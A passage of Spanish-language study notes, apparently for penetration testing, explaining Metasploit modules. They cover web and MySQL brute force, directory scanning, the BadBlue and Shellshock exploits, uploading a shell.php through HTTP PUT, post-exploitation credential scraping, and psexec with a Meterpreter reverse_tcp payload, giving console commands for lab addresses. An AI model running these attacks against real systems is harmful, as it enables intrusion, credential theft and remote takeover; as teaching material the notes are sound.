			- El módulo `http_login` de Metasploit es un módulo auxiliar diseñado para realizar ataques de fuerza bruta contra formularios de autenticación web que utilizan el protocolo HTTP. Este módulo intenta adivinar combinaciones de nombres de usuario y contraseñas en un sitio web mediante el envío repetido de solicitudes HTTP al servidor, con diferentes credenciales hasta encontrar las correctas.
				- ### Descripción del Módulo
					
					- **Nombre del módulo:** `http_login`
					- **Tipo de módulo:** Auxiliar (scanner)
					- **Función principal:** Realiza ataques de fuerza bruta sobre formularios de autenticación HTTP en sitios web.
				- ### Funcionamiento del Módulo
					
					1. **Ataque de Fuerza Bruta de Credenciales:**
					    
					    - El módulo envía múltiples solicitudes HTTP al formulario de inicio de sesión de un sitio web, intentando diferentes combinaciones de nombres de usuario y contraseñas.
					    - Puedes configurar el módulo para usar diccionarios de usuarios y contraseñas, o también puedes especificar una única combinación a probar.
					2. **Configuración de Objetivos:**
					    
					    - Es necesario especificar la URL del formulario de autenticación que se desea atacar.
					    - El módulo puede trabajar con diferentes tipos de autenticación, como autenticación básica, digest, NTLM, y formularios HTML personalizados.
					3. **Manejo de Resultados:**
					    
					    - Si el módulo encuentra credenciales válidas, las reportará como exitosas.
					    - Los resultados pueden ser guardados y utilizados posteriormente para acceder al sitio web con las credenciales correctas.
				- ### Ejecución del Módulo en Metasploit
	
					1. **Seleccionar el Módulo:**
					    
					    Primero, selecciona el módulo en Metasploit:
					      
					    `use auxiliary/scanner/http/http_login`
					    
					2. **Configurar las Opciones:**
					    
					    Configura las opciones necesarias para el ataque. Las opciones más comunes incluyen:
					    
					    - **`RHOSTS`**: La dirección IP o dominio del servidor web objetivo.
					    - **`RPORT`**: El puerto en el que el servidor web está escuchando (por defecto, es 80 para HTTP y 443 para HTTPS).
					    - **`TARGETURI`**: La ruta del formulario de autenticación en el servidor.
					    - **`USER_FILE`**: La ruta a un archivo que contiene una lista de nombres de usuario para intentar.
					    - **`PASS_FILE`**: La ruta a un archivo que contiene una lista de contraseñas para intentar.
					    - **`BLANK_PASSWORDS`**: Intentar iniciar sesión con contraseñas en blanco.
					    - **`BRUTEFORCE_SPEED`**: Controla la velocidad del ataque de fuerza bruta.
					    - **`STOP_ON_SUCCESS`**: Detiene el ataque cuando se encuentra una combinación válida.
					    - **`VHOST`**: El nombre del host virtual, si es necesario (para servidores con múltiples dominios).
		- **Modulo para buscqueda o escaneo de directorios:
			- El módulo `dir_scanner` de Metasploit es un módulo auxiliar utilizado para realizar una búsqueda (o escaneo) de directorios y archivos en un servidor web. Este módulo intenta descubrir directorios ocultos o sensibles y archivos en un servidor web que podrían no ser listados públicamente, pero que son accesibles si se conoce la ruta.
				- ### Descripción del Módulo
					
					- **Nombre del módulo:** `dir_scanner`
					- **Tipo de módulo:** Auxiliar (Scanner)
					- **Función principal:** Escanea un servidor web en busca de directorios y archivos conocidos o comunes.
				- ### Funcionamiento del Módulo	
					1. **Fuerza Bruta de Rutas de Directorios y Archivos:**
					    
					    - El módulo funciona al enviar solicitudes HTTP al servidor web, intentando acceder a una lista de rutas predefinidas.
					    - La lista de rutas puede contener nombres de directorios y archivos comunes, como `admin/`, `login.php`, `backup/`, etc.
					    - Si el servidor responde con un código HTTP que indica que el recurso existe (por ejemplo, `200 OK`), el módulo lo reporta como encontrado.
					2. **Configuración de Objetivos:**
					    
					    - Puedes apuntar el módulo a un servidor específico configurando su dirección IP (`RHOSTS`) y el puerto donde el servidor web está escuchando (`RPORT`).
					    - También se puede especificar una lista de directorios y archivos personalizados si deseas buscar rutas específicas.
					3. **Identificación de Rutas Sensibles:**
					    
					    - El objetivo es descubrir rutas que podrían contener información sensible o configuraciones importantes que no deberían estar accesibles públicamente.
					    - Esto podría incluir paneles de administración, archivos de configuración, copias de seguridad, etc.
				- ### Ejecución del Módulo en Metasploit
	
					1. **Seleccionar el Módulo:**
					    
					    Inicia Metasploit y selecciona el módulo `dir_scanner`:
					    				    
					    `use auxiliary/scanner/http/dir_scanner`
					    
					2. **Configurar las Opciones:**
					    
					    Configura las opciones necesarias para el escaneo. Las más importantes son:
					    
					    - **`RHOSTS`**: La dirección IP o dominio del servidor web que deseas escanear.
					    - **`RPORT`**: El puerto en el que está escuchando el servidor web (por defecto es 80 para HTTP y 443 para HTTPS).
					    - **`TARGETURI`**: La ruta base en la que quieres realizar el escaneo (por ejemplo, `/`).
					    - **`THREADS`**: El número de hilos que quieres utilizar para acelerar el escaneo.
					    - **`FILE`**: Especifica el archivo que contiene la lista de rutas de directorios y archivos a escanear. Si no se proporciona, se usa una lista por defecto.
		- **Modulo para buscar archivos y directorios:
			- El módulo `files_dir` de Metasploit es un módulo auxiliar que se utiliza para buscar archivos y directorios en un servidor web a través de técnicas de fuerza bruta o diccionario. Este módulo es útil para descubrir recursos ocultos o no listados en un servidor web, como archivos de configuración, directorios de administración, o archivos de respaldo.
				- ### Descripción del Módulo
					
					- **Nombre del módulo:** `files_dir`
					- **Tipo de módulo:** Auxiliar (auxiliary/scanner)
					- **Función principal:** Enumerar archivos y directorios en un servidor web.
				- ### Funcionalidad del Módulo
	
					- El módulo `files_dir` funciona probando una lista de rutas de archivos y directorios en un servidor web para ver si existen. Esto se hace utilizando una lista predefinida de rutas comunes o una lista personalizada proporcionada por el usuario.
					
					 1. **Brute Forcing de Rutas:**
					
					- El módulo intenta acceder a varias rutas en un servidor web utilizando las rutas definidas en un diccionario.
					- Si la ruta existe, el servidor web generalmente devolverá un código de estado HTTP 200, lo que indica que el recurso fue encontrado.
					- También puede identificar códigos de estado HTTP 403 (Prohibido) que indican la existencia de un recurso que no se puede acceder.
					
					 2. **Identificación de Archivos y Directorios:**
					
					- Este módulo puede ser utilizado para descubrir directorios de administración, archivos de respaldo, configuraciones sensibles, y otros recursos que no estén listados directamente en la página web.
					- Es especialmente útil durante una auditoría de seguridad o pruebas de penetración para identificar superficies de ataque adicionales en una aplicación web.
				- ### Ejecución del Módulo en Metasploit
	
					1. **Seleccionar el Módulo:**
					    
					    Primero, selecciona el módulo en la consola de Metasploit:
					       
					    `use auxiliary/scanner/http/files_dir`
					    
					2. **Configurar las Opciones:**
					    
					    Configura las opciones necesarias para el escaneo. Las opciones principales incluyen:
					    
					    - **`RHOSTS`**: La dirección IP o el rango de direcciones IP del servidor web objetivo.
					    - **`RPORT`**: El puerto en el que el servidor web está escuchando (por defecto, el puerto es 80 para HTTP y 443 para HTTPS).
					    - **`TARGETURI`**: La ruta base en la que deseas iniciar el escaneo. Por ejemplo, `/` para escanear desde la raíz.
					    - **`FILE`**: La ruta al archivo de diccionario que contiene las rutas de archivos y directorios a probar.
					    - **`EXTENSIONS`**: Especifica las extensiones de archivos adicionales para intentar, como `.bak`, `.old`, `.php`, etc.
					    - **`HTTP_METHOD`**: El método HTTP a utilizar (GET o HEAD). HEAD es más rápido, ya que solo solicita los encabezados HTTP y no el cuerpo completo de la respuesta.
		- **Script para verificar la existencia de archivos de volvado de datos:**
			- El módulo `mysql_hasdump` de Metasploit es una herramienta diseñada para verificar la existencia de archivos de volcado de bases de datos (dumps) de MySQL en un servidor web. Estos archivos de volcado, a menudo con extensiones como `.sql`, `.dump`, o `.sql.gz`, pueden contener datos sensibles y, por lo tanto, representar un riesgo de seguridad si están expuestos sin la debida protección.
				- ### Funcionalidad del Módulo `mysql_hasdump`
	
					1. **Escaneo de Directorios Web:** El módulo explora el servidor web en busca de archivos que podrían ser volcados de bases de datos MySQL. Se enfoca en encontrar archivos con nombres comunes y extensiones relacionadas con dumps de bases de datos.
					2. **Revisión de Extensiones y Nombres Comunes:** Busca archivos con nombres que a menudo se usan para volcar bases de datos, como `dump.sql`, `backup.sql`, `database.sql`, etc. También puede buscar archivos comprimidos como `dump.sql.gz`.
					3. **Verificación de Accesibilidad:** Comprueba si estos archivos están accesibles públicamente a través del servidor web.
					```
					use auxiliary/scanner/http/mysql_hasdump
					```
		- **Modulo para enumerar dir y usuarios en server apache:
			- El módulo s de Metasploit es una herramienta de enumeración utilizada para identificar usuarios en un servidor Apache que tiene habilitado el módulo `mod_userdir`. Este módulo Apache permite a los usuarios tener directorios web personales accesibles a través de una URL como `http://servidor/~usuario/`.
	
				- ### Descripción del Módulo
					
					- **Nombre del módulo:** `apache_userdir_enum`
					- **Tipo de módulo:** Auxiliar (no es un exploit)
					- **Función principal:** Enumerar los nombres de usuario válidos en un servidor Apache que tiene habilitado `mod_userdir`.
				- ### Funcionamiento del Módulo
					
					1. **Enumeración de Directorios Personales:**
					    
					    - Apache permite a los usuarios alojar su propio contenido web en sus directorios personales cuando el módulo `mod_userdir` está habilitado.
					    - Este contenido suele ser accesible a través de URLs del tipo `http://servidor/~usuario/`.
					    - El módulo `apache_userdir_enum` intenta acceder a estas URLs para descubrir qué nombres de usuario son válidos en el servidor.
					2. **Proceso de Enumeración:**
					    
					    - El módulo toma una lista de posibles nombres de usuario y construye URLs para cada uno.
					    - Luego, el módulo envía solicitudes HTTP a estas URLs y analiza las respuestas.
					    - Si el servidor responde con un código de estado 200 (OK), es probable que el nombre de usuario exista.
					    - Respuestas como 404 (Not Found) o 403 (Forbidden) pueden indicar que el usuario no existe o que el acceso está restringido.
					3. **Uso en Pruebas de Seguridad:**
					    
					    - Este tipo de enumeración puede ser útil en un contexto de prueba de penetración para identificar usuarios válidos en un sistema.
					    - Los usuarios identificados pueden ser luego objetivos de otros ataques, como intentos de fuerza bruta para adivinar contraseñas.
				- ### Ejecución del Módulo en Metasploit
					
					1. **Seleccionar el Módulo:**
					    
					    Primero, selecciona el módulo en Metasploit:
					      
					    `use auxiliary/scanner/http/apache_userdir_enum`
					    
					2. **Configurar las Opciones:**
					    
					    Configura las opciones necesarias para la enumeración. Algunas opciones comunes incluyen:
					    
					    - **`RHOSTS`**: La dirección IP o el dominio del servidor objetivo.
					    - **`RPORT`**: El puerto en el que está escuchando el servidor web (por defecto, el puerto es 80 para HTTP o 443 para HTTPS).
					    - **`USERNAME`** o **`USER_FILE`**: Puedes especificar un solo nombre de usuario con `USERNAME` o una lista de nombres de usuario en un archivo con `USER_FILE`.
					    - **`SSL`**: Configúralo en `true` si el servidor utiliza HTTPS.
		- **Modulo para obtener informacion de las cabeceras:
			- El módulo `http_header` de Metasploit es un módulo auxiliar que se utiliza para obtener información y analizar las cabeceras HTTP de un servidor web objetivo. Las cabeceras HTTP pueden revelar información útil sobre el servidor web, su configuración, las tecnologías utilizadas y posibles vulnerabilidades. Este módulo es útil para realizar un reconocimiento inicial de un objetivo durante una evaluación de seguridad.
				- ### Descripción del Módulo
					
					- **Nombre del módulo:** `http_header`
					- **Tipo de módulo:** Auxiliar (no es un exploit)
					- **Función principal:** Realizar peticiones HTTP y analizar las respuestas del servidor para obtener y mostrar las cabeceras HTTP.
				- ### Funcionamiento del Módulo
					
					1. **Envía una Petición HTTP:**
					    
					    - El módulo realiza una solicitud HTTP (generalmente una petición `GET`) al servidor objetivo.
					    - Puedes configurar el módulo para apuntar a un recurso específico en el servidor (como una página web o un archivo).
					2. **Captura y Muestra las Cabeceras:**
					    
					    - El servidor responde con las cabeceras HTTP que contienen metadatos sobre el servidor y la respuesta.
					    - El módulo captura estas cabeceras y las muestra en la salida de la consola de Metasploit.
					3. **Información Recolectada:**
					    
					    - **Server:** El software del servidor web en uso (por ejemplo, Apache, Nginx, etc.), incluyendo la versión.
					    - **X-Powered-By:** La tecnología utilizada por el servidor (por ejemplo, PHP, ASP.NET).
					    - **Set-Cookie:** Cookies que pueden ser utilizadas para seguimiento o autenticación.
					    - **Content-Type:** El tipo de contenido de la respuesta (por ejemplo, `text/html`, `application/json`).
					    - **Date:** La fecha y hora en que se generó la respuesta.
					    - **Cache-Control:** Indicaciones sobre cómo el contenido debe ser almacenado en caché.
				- ### Ejecución del Módulo en Metasploit
								
					1. **Seleccionar el Módulo:**
						
						Primero, carga el módulo en Metasploit:
											
						`use auxiliary/scanner/http/http_header`
						
					2. **Configurar las Opciones:**
						
						Configura las opciones necesarias. Las opciones más importantes incluyen:
						
						- **`RHOSTS`**: La dirección IP del servidor objetivo (o rango de direcciones IP).
						- **`RPORT`**: El puerto en el que está escuchando el servidor web (por defecto, el puerto es 80 para HTTP o 443 para HTTPS).
						- **`TARGETURI`**: La URI del recurso que deseas consultar (por defecto `/`, que es la raíz del sitio).
						- **`SSL`**: Configura si deseas usar HTTPS en lugar de HTTP
						- 
		- **Modulo para la vulnerabilidad BadBlue
			- El módulo **`badblue_passthru`** de Metasploit es un exploit diseñado para aprovechar una vulnerabilidad en el software **BadBlue**, un servidor web ligero y antiguo, utilizado principalmente en sistemas Windows. La vulnerabilidad reside en cómo BadBlue maneja las solicitudes HTTP a través de su función **"passthru.dll"**, que permite la ejecución remota de comandos en el servidor sin autenticación adecuada.
				- ### Descripción de la vulnerabilidad
					- BadBlue contiene una función que permite la ejecución de scripts a través de una interfaz CGI utilizando la DLL llamada `passthru.dll`. Sin embargo, el manejo de esta funcionalidad no valida adecuadamente los parámetros que recibe, lo que permite que un atacante remoto pase comandos directamente al sistema operativo subyacente. Esto habilita la ejecución arbitraria de comandos, lo que se conoce como **Remote Code Execution (RCE)**.
				- ### Detalles del exploit

					- El módulo **`badblue_passthru`** explota esta debilidad al enviar una solicitud HTTP maliciosa que incluye un comando del sistema. El servidor BadBlue, al no validar correctamente los parámetros, ejecuta el comando en el sistema de la víctima con los privilegios del usuario bajo el cual se está ejecutando el servidor.
				- ### Función del exploit

					1. **Plataforma**: Windows
					2. **Servicios vulnerables**: BadBlue versión 2.7 y versiones anteriores
					3. **Tipo de ataque**: Remote Code Execution (RCE)
					4. **Método de explotación**:
				    - El atacante envía una solicitud HTTP manipulada que incluye una instrucción maliciosa en la URL a través de la DLL vulnerable `passthru.dll`.
				    - El servidor BadBlue procesa la solicitud y ejecuta el comando en el sistema, lo que permite al atacante tomar control remoto del servidor.
				- ### Uso en Metasploit

					1. Abrir Metasploit y buscar el módulo:
					   
					    `msfconsole`
					    
					    Luego, buscar el módulo:
					   
					    `search badblue_passthru`
					    
					2. Seleccionar el módulo:
					    
					    `use exploit/windows/http/badblue_passthru`
					    
					3. Configurar los parámetros necesarios:
					    
					    - **RHOST**: La dirección IP del servidor donde se ejecuta BadBlue.
					    - **RPORT**: El puerto en el que está corriendo el servidor (por defecto, 80).
					    - **CMD**: El comando que deseas ejecutar en la máquina de la víctima.
					    
					    Ejemplo:
					      `set RHOST 192.168.1.100 set RPORT 80 set CMD ipconfig`
					    
					4. Ejecutar el exploit:
					      
					    `exploit`
		- **Modulo para shellshock
			- El módulo **`apache_mod_cgi_bash_env_exec`** es un exploit que se utiliza para aprovechar la vulnerabilidad **Shellshock** (CVE-2014-6271), en servidores Apache que ejecutan scripts **CGI**. Esta vulnerabilidad afecta al shell **Bash**, permitiendo a un atacante remoto ejecutar comandos arbitrarios en servidores que no han aplicado el parche de seguridad.
			- ### Contexto de la vulnerabilidad Shellshock

				- Shellshock es una vulnerabilidad que permite la ejecución de código remoto en servidores que usan Bash para manejar variables de entorno, como es el caso de scripts CGI (Common Gateway Interface). Los scripts CGI son programas que los servidores web ejecutan para generar contenido dinámico, y muchas veces interactúan con el sistema operativo mediante Bash, lo que hace que estos scripts sean un vector de ataque para Shellshock.
				
				- El exploit **`apache_mod_cgi_bash_env_exec`** aprovecha esta vulnerabilidad en servidores que tienen habilitado el módulo **mod_cgi** de Apache para ejecutar scripts CGI.
			- ### ¿Cómo funciona el exploit?
				
				- Este módulo de exploit se encuentra en plataformas como **Metasploit** y aprovecha la vulnerabilidad Shellshock para ejecutar comandos en un servidor Apache que ejecuta scripts CGI vulnerables. A continuación se describe cómo opera:
				
				1. **Carga del exploit**: El atacante utiliza el módulo `apache_mod_cgi_bash_env_exec` de Metasploit para atacar un servidor que ejecuta scripts CGI vulnerables. El ataque se lanza a través de una solicitud HTTP.
				    
				2. **Envío de la carga maliciosa (payload)**: El exploit inyecta un payload en las cabeceras HTTP que envía al servidor objetivo. El payload se inserta en variables de entorno (como `User-Agent` o `Referer`), que luego son procesadas por Bash. Un ejemplo típico de payload es:
				    
				    `() { :; }; <comando-malicioso>`
				    
				    El exploit inserta comandos arbitrarios que se ejecutarán si el servidor Bash es vulnerable.
				    
				3. **Ejecución del comando**: Si el servidor es vulnerable, Bash ejecutará el código malicioso que fue inyectado en la cabecera HTTP. Esto permite que el atacante ejecute comandos en el servidor de forma remota, logrando acceso o control sobre el sistema.
				    
				4. **Resultados**: Si el ataque es exitoso, el atacante puede tomar control del sistema y realizar acciones como la descarga de archivos, la escalada de privilegios, o la instalación de software malicioso.
		    - ### Parámetros importantes del exploit
				
				- Cuando se usa en Metasploit, se pueden configurar ciertos parámetros que ayudan a personalizar el ataque:
					
					- **RHOST**: La dirección IP del servidor vulnerable.
					- **RPORT**: El puerto donde está ejecutándose el servidor web (por defecto 80 o 443).
					- **TARGETURI**: La URI (o ruta) del script CGI vulnerable, por ejemplo, `/cgi-bin/vulnerable_script`.
		- **Modulo para cargar archivos en server web**
			- El módulo `http_put` de Metasploit se utiliza para cargar archivos en servidores web que permiten el método HTTP PUT. Este método es una solicitud HTTP que permite a un cliente cargar archivos directamente en el servidor, similar a cómo subirías un archivo a un sitio web. Sin embargo, no todos los servidores web permiten este método por razones de seguridad.
			- ### Funcionamiento del módulo `http_put`
				
				1. **Propósito**: El módulo intenta subir un archivo al servidor de destino usando el método HTTP PUT, aprovechando configuraciones incorrectas o vulnerabilidades en la implementación del servidor web.
				2. **Uso típico**: Puede ser utilizado para cargar un archivo malicioso, como un shell web, que luego podría ejecutarse para obtener acceso remoto al servidor.
			- ### Configuración del módulo
				
				- **RHOSTS**: La dirección IP o el rango de IPs del objetivo.
				- **RPORT**: El puerto del servicio web (por defecto, 80 o 443 para HTTPS).
				- **TARGETURI**: La ruta del servidor donde se intentará la carga.
				- **FILENAME**: Nombre del archivo que se intentará subir.
				- **DATA**: Contenido del archivo que se va a cargar, que podría ser un payload.
			- ### Ejemplo de uso:
				
				1. Selecciona el módulo:
				    				    
				    `use auxiliary/scanner/http/http_put`
				    
				2. Configura las opciones necesarias:
				    				    
				    `set RHOSTS 192.168.1.10 set RPORT 80 set TARGETURI /uploads/ set FILENAME shell.php`
				    
				3. Ejecuta el módulo:
				    				    
				    `run`
				    
				
				- Si el servidor permite el método PUT, el archivo se cargará en la ruta especificada. Después de esto, podrías acceder a la URL del archivo cargado para verificar que se haya subido correctamente.
		- **Modulo para obtener informacion del sistema**
			- El módulo **scraper** de Metasploit es una herramienta diseñada para obtener información detallada de un sistema comprometido. Se utiliza principalmente después de haber obtenido acceso a una máquina víctima para realizar tareas de post-explotación. El propósito principal es **recopilar información** útil que permita a un atacante o auditor de seguridad conocer mejor el entorno, identificar más vulnerabilidades, o simplemente obtener más datos para moverse lateralmente dentro de la red.
			- ### Funciones principales del módulo scraper:
				
				1. **Obtención de Información del Sistema**:
				    
				    - Recopila detalles básicos sobre el sistema operativo, como la versión, nombre del host, usuarios activos, etc.
				    - Identifica las aplicaciones instaladas en el sistema.
				2. **Extracción de Información del Registro (en Windows)**:
				    
				    - Busca y extrae información del registro, como credenciales guardadas, detalles de configuración de red, claves de software, y más.
				3. **Recolección de Credenciales**:
				    
				    - Extrae credenciales almacenadas en el sistema, como las de navegadores, clientes de correo, credenciales Wi-Fi, entre otras.
				4. **Listar Servicios y Procesos**:
				    
				    - Identifica los servicios que están ejecutándose en la máquina y los procesos activos, lo que puede proporcionar información valiosa sobre posibles vectores de ataque adicionales o movimientos posteriores.
				5. **Información de Red**:
				    
				    - Recoge datos de configuración de red, como interfaces, puertas de enlace y conexiones activas, lo que permite conocer la topología de red a la que está conectada la máquina.
			- ### Uso del módulo scraper:
				
				- Para ejecutar el módulo scraper dentro de Metasploit, primero necesitas tener una sesión abierta en una máquina comprometida (por ejemplo, mediante una sesión Meterpreter). A partir de allí, el comando básico para ejecutar el scraper es:
				
				1. **Seleccionar el módulo**:
				    			    
				    `use post/windows/gather/scraper`
				    
				2. **Configurar la sesión**:
				    
				    `set SESSION <ID_de_sesion>`
				    
				    Aquí debes reemplazar `<ID_de_sesion>` por el identificador de la sesión Meterpreter que obtuviste después de comprometer el sistema.
				    
				3. **Ejecutar el módulo**:
				    
				    `run`
		- **Modulo para ejecutar comando de manera remota en windows
			- El módulo **psexec** en Metasploit es una herramienta utilizada para ejecutar comandos de forma remota en un sistema Windows utilizando credenciales válidas. Este módulo se aprovecha de las capacidades del **Servicio de Ejecución Remota** de Windows (Windows Remote Management, **WinRM**) o el **Servicio de Terminal Server** y es especialmente útil para obtener una sesión remota (meterpreter) en máquinas dentro de una red interna o controlada.
				- ### ¿Qué es `psexec`?

					- **PsExec** es una herramienta de la suite **Sysinternals** de Microsoft que permite la ejecución de procesos en equipos remotos sin necesidad de instalar agentes. Metasploit utiliza esta funcionalidad para crear una sesión en el sistema remoto siempre que se proporcionen las credenciales de administrador o credenciales válidas.
				- ### ¿Cómo funciona el módulo `psexec` en Metasploit?
					
					1. **Autenticación**:
					    - El módulo `psexec` requiere **credenciales válidas** (nombre de usuario y contraseña, o hashes LM/NTLM). Esto significa que se necesita acceso previo a credenciales correctas del objetivo para usar este ataque.
					2. **Conexión**:
					    - El módulo intenta conectarse a través de la red (normalmente por el puerto **445/TCP**, que es usado por el protocolo SMB). Si la autenticación es exitosa, puede proceder a ejecutar comandos en la máquina remota.
					3. **Copia de un binario**:
					    - El módulo copia un archivo ejecutable o un servicio malicioso (usualmente un **payload** de Metasploit como `meterpreter`) en la carpeta compartida administrativa de Windows (`C$` o `ADMIN$`).
					4. **Ejecución del payload**:
					    - Una vez copiado el binario en el sistema objetivo, el módulo ejecuta ese archivo, estableciendo una conexión de retorno al atacante. Esto otorga una sesión remota en el sistema víctima.
				- ### Usos comunes del módulo `psexec`
					
					- **Post-explotación**: Una vez que se obtienen credenciales válidas de un sistema, `psexec` es usado comúnmente para moverse lateralmente en la red corporativa y comprometer otros sistemas.
					- **Persistencia**: Ejecutar scripts o cargas útiles que permiten al atacante mantener acceso al sistema comprometido.
					- **Evasión de detección**: Debido a que `psexec` usa funciones nativas de Windows, a menudo puede evadir algunos sistemas de detección basados en firmas.
				- ### Ejemplo de uso del módulo `psexec` en Metasploit
					
					1. Abrir Metasploit:
					
					    `msfconsole`
					    
					2. Seleccionar el módulo `psexec`:
					    
					    `use exploit/windows/smb/psexec`
					    
					3. Establecer las opciones necesarias:
					    
					    - `RHOSTS`: La IP o el rango de IPs de las máquinas objetivo.
					    - `SMBDomain`: El dominio si estás en un entorno con dominio (opcional).
					    - `SMBUser`: El nombre de usuario con privilegios de administrador.
					    - `SMBPass`: La contraseña o el hash del usuario.
					    - `PAYLOAD`: Establecer el payload que se ejecutará, como `windows/meterpreter/reverse_tcp`.
					    
					    Ejemplo de configuración de opciones:
					    
					    `set RHOSTS 192.168.1.100 set SMBUser administrador set SMBPass password123 set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 192.168.1.50 set LPORT 4444`
					    
					4. Ejecutar el ataque:
					
					    `exploit`
					    
						- Si las credenciales son correctas y el sistema es vulnerable, se abrirá una sesión de **Meterpreter** que permite realizar acciones post-explotación en el sistema remoto.
	- ## MYSQL:
		- **Modulo para fuerza bruta sobre le login:**
			- El módulo `mysql_login` de Metasploit es una herramienta diseñada para realizar ataques de fuerza bruta (brute force) contra servidores MySQL. Su objetivo es intentar varias combinaciones de nombres de usuario y contraseñas hasta encontrar credenciales válidas que permitan acceder al servidor MySQL.
				- ### Funcionalidad del Módulo `mysql_login`
	
					- El módulo `mysql_login` intenta autenticarse en un servidor MySQL usando una lista de nombres de usuario y contraseñas. Si encuentra una combinación válida, se puede utilizar para acceder a la base de datos, ejecutar consultas y potencialmente comprometer el sistema.
				```
				use auxiliary/scanner/mysql/mysql_login
				```
		- **Modulo para identificar version:
			- El módulo `mysql_version` de Metasploit es un módulo auxiliar que se utiliza para identificar la versión del servidor MySQL en un sistema remoto. Este módulo no realiza una explotación activa, sino que simplemente se conecta al servidor MySQL y extrae la información sobre la versión. Conocer la versión de MySQL es útil para identificar posibles vulnerabilidades que podrían ser explotadas en futuras fases de una auditoría de seguridad o prueba de penetración.
				- ### Descripción del Módulo
					
					- **Nombre del módulo:** `mysql_version`
					- **Tipo de módulo:** Auxiliar (Auxiliary)
					- **Función principal:** Detectar y mostrar la versión del servidor MySQL en un sistema remoto.
				- ### Cómo Funciona
					1. **Conexión al Servidor MySQL:**
					    
					    - El módulo intenta establecer una conexión al puerto MySQL predeterminado (generalmente el puerto 3306) en el host objetivo.
					    - No requiere credenciales de autenticación, ya que la versión del servidor generalmente se envía como parte de la respuesta de bienvenida del servidor MySQL.
					2. **Extracción de la Versión:**
					    
					    - Una vez que se establece la conexión, el servidor MySQL devuelve un mensaje de bienvenida que incluye información sobre la versión.
					    - El módulo extrae esta información y la muestra en la consola de Metasploit.
					3. **Identificación del Objetivo:**
					    
					    - Con la versión de MySQL identificada, un atacante o auditor de seguridad puede buscar posibles vulnerabilidades conocidas en esa versión específica de MySQL.
				- ### Ejecución del Módulo en Metasploit
	
					1. **Seleccionar el Módulo:**
					    
					    Abre Metasploit y selecciona el módulo `mysql_version`:
					    				    
					    `use auxiliary/scanner/mysql/mysql_version`
					    
					2. **Configurar las Opciones:**
					    
					    Configura las opciones necesarias, como la dirección IP (`RHOSTS`) del servidor MySQL y el puerto (`RPORT`) si no es el predeterminado.
					    				    
					    `set RHOSTS <ip_del_servidor_mysql> set RPORT 3306`
					    
					    Ejemplo:
					    				    
					    `set RHOSTS 192.168.1.10`
					    
					3. **Ejecutar el Módulo:**
					    
					    Ejecuta el módulo para obtener la versión del servidor MySQL:
					    				    
					    `run`
					    
					    El módulo se conectará al servidor MySQL en la dirección IP y puerto especificados y mostrará la versión del servidor en la salida.
					    
					4. **Revisar la Salida:**
					    
					    La salida mostrará algo como esto:
					    				    
					    `[*] 192.168.1.10:3306 - MySQL Server version 5.7.26-0ubuntu0.18.04.1 [*] Scanned 1 of 1 hosts (100% complete)`
					    
					    Aquí, `5.7.26-0ubuntu0.18.04.1` es la versión específica del servidor MySQL en el host objetivo.
		- **modulo que permite realizar consultas sql:**
			- El módulo `mysql_sql` de Metasploit es un módulo auxiliar que permite ejecutar consultas SQL arbitrarias en un servidor MySQL. Este módulo es útil para realizar pruebas de seguridad en bases de datos MySQL, permitiendo al usuario interactuar directamente con la base de datos una vez que tiene acceso a las credenciales.
				- ### Funcionamiento del Módulo
	
					- El módulo `mysql_sql` se utiliza principalmente para interactuar con una base de datos MySQL después de haber obtenido acceso a ella, típicamente después de haber encontrado credenciales válidas (por ejemplo, mediante fuerza bruta con el módulo `mysql_login`). Una vez que tienes acceso, puedes usar este módulo para:
						
						1. **Ejecutar Consultas SQL:**
						    
						    - Ejecuta cualquier comando SQL, como `SELECT`, `INSERT`, `UPDATE`, `DELETE`, entre otros.
						    - Puedes usar este módulo para enumerar bases de datos, tablas, usuarios, y más.
						2. **Pruebas de Seguridad:**
						    
						    - Verifica la seguridad de la base de datos, por ejemplo, buscando configuraciones débiles o datos sensibles.
						    - Probar si las consultas SQL pueden ser ejecutadas con permisos elevados.
						3. **Exfiltración de Datos:**
						    
						    - Si se tienen permisos suficientes, el módulo puede extraer información sensible de la base de datos, como listas de usuarios, contraseñas hash, etc.
				- ### Ejecución del Módulo en Metasploit
	
					1. **Seleccionar el Módulo:**
					    
					    Primero, selecciona el módulo en Metasploit:
					       
					    `use auxiliary/admin/mysql/mysql_sql`
					    
					2. **Configurar las Opciones:**
					    
					    Configura las opciones necesarias para ejecutar la consulta SQL. Algunas opciones clave son:
					    
					    - **`RHOSTS`**: La dirección IP del servidor MySQL objetivo.
					    - **`RPORT`**: El puerto en el que está escuchando el servicio MySQL (por defecto, el puerto es 3306).
					    - **`USERNAME`**: El nombre de usuario de la base de datos MySQL.
					    - **`PASSWORD`**: La contraseña del usuario MySQL.
					    - **`SQL`**: La consulta SQL que deseas ejecutar en la base de datos.
		- **Modulo para extraer la estructura de bd:**
			- El módulo `mysql_schemadump` de Metasploit es un módulo auxiliar diseñado para extraer la estructura de la base de datos MySQL, incluyendo tablas, columnas, tipos de datos y otras propiedades del esquema de la base de datos. Este módulo no extrae los datos contenidos en las tablas, sino que se enfoca en obtener la estructura de la base de datos.
				- ### Descripción del Módulo
					
					- **Nombre del módulo:** `mysql_schemadump`
					- **Tipo de módulo:** Auxiliar (no es un exploit)
					- **Función principal:** Realiza un volcado del esquema de la base de datos MySQL, es decir, extrae y muestra la estructura de las bases de datos, tablas y columnas.
				- ### Funcionamiento del Módulo
	
					- Este módulo se conecta a una base de datos MySQL utilizando credenciales válidas y luego ejecuta consultas para extraer información sobre el esquema de la base de datos. Esta información incluye:
						
						- **Bases de datos disponibles:** Lista de todas las bases de datos en el servidor.
						- **Tablas en cada base de datos:** Nombre de cada tabla dentro de una base de datos.
						- **Columnas en cada tabla:** Nombre de cada columna dentro de una tabla, junto con su tipo de datos y otras propiedades relevantes.
				
				- ### ¿Por qué es útil?
	
					- **Reconocimiento:** Si un atacante obtiene acceso a una base de datos MySQL (por ejemplo, a través de credenciales comprometidas), podría usar este módulo para mapear la estructura completa de la base de datos. Esto le da una visión clara de la organización de los datos y puede ayudar a planificar futuros ataques, como la inyección de SQL o la exfiltración de datos.
					- **Auditoría:** Los administradores de bases de datos o los pentesters pueden utilizar este módulo para revisar la estructura de la base de datos en busca de posibles problemas de seguridad, como la exposición de información sensible a través de nombres de tablas o columnas.
				- ### Ejecución del Módulo en Metasploit
	
					1. **Seleccionar el Módulo:**
					    
					    Primero, selecciona el módulo en Metasploit:
					       
					    `use auxiliary/admin/mysql/mysql_schemadump`
					    
					2. **Configurar las Opciones:**
					    
					    Configura las opciones necesarias para el ataque. Algunas de las opciones más comunes incluyen:
					    
